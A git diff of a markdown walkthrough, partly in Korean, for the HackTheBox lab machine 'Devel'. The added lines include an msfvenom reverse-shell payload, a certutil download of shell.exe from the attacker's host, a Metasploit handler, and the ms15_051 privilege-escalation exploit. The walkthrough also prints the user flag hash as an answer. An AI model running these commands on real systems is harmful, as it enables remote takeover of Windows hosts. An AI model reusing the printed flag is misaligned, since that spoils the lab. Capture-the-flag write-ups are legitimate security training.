@@ -1,4 +1,3 @@
-
 # HackTheBox Walkthrough - Machine: Devel
 
 **Target IP**: 10.129.62.33  
@@ -16,10 +15,14 @@
   ```bash
   nmap -sV -sC -oA nmap/Devel 10.129.62.33
   ```
+  ![nmap](img/nmap.png)
+
 - 결과:
   ```
   21/tcp open  ftp     Microsoft ftpd
   ```
+  ![ftp](img/ftp.png)
+
 - 익명 로그인 가능 및 기본 웹파일 존재 확인
 
 ---
@@ -43,6 +46,7 @@
 ## Task 4  
 **Question**: What file extension is executed as a script on this webserver?  
 **Answer**: `aspx`  
+![Net](img/Net.png)
 
 - 서버 정보: `X-Powered-By: ASP.NET`  
 - `.php` 미작동, `.aspx` 파일만 실행됨
@@ -66,10 +70,13 @@
    ```
    http://10.129.62.33/shell.aspx
    ```
+![shellconnect](img/shellconnect.png)
+
 5. 쉘 획득 후 `user.txt` 확인:  
    ```bash
    type C:\Users\babis\Desktop\user.txt
    ```
+![uesrflag](img/uesrflag.png)
 
 **Answer**: `5b8faa08515e0b393c478f508f68eb70`
 
@@ -79,36 +86,60 @@
 **Question**: Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?  
 **Answer**: `local_exploit_suggester`  
 
-**Command**:
+## Privilege Escalation
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.156 LPORT=4444 -f exe > shell.exe
+certutil -urlcache -f http://10.10.14.156:7777/shell.exe shell.exe
+```
+![payload](img/payload.png)
+
+![meterpreter](img/meterpreter.png)
+
+```bash
+msfconsole
+use exploit/multi/handler 
+set payload windows/meterpreter/reverse_tcp
+set lhost tun0
+run
+```
+
+![local_exploit_suggester](img/local_exploit_suggester.png)
+
 ```bash
 use post/multi/recon/local_exploit_suggester
 set session 1
 run
 ```
 
----
+12번 실패 → 10번 exploit 사용
 
-## Privilege Escalation
-
-### 첫 번째 시도 (실패):
-- 모듈: `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
-- 실패
-
-### 두 번째 시도 (성공):
-- 모듈: `exploit/windows/local/ms15_051_client_copy_image`
 ```bash
 use exploit/windows/local/ms15_051_client_copy_image
 set session 1
 set LHOST 10.10.14.156
 run
 ```
-- `getuid` 결과: `NT AUTHORITY\SYSTEM`
+
+```bash
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+![root](img/root.png)
+
+```bash
+cat user.txt
+```
+> 5b8faa08515e0b393c478f508f68eb70
 
 ---
 
 ## Submit Root Flag
 
-**Command**:
+Submit the flag located on the administrator's desktop.  
+![rootflag](img/rootflag.png)
+
 ```bash
 type C:\Users\Administrator\Desktop\root.txt
 ```
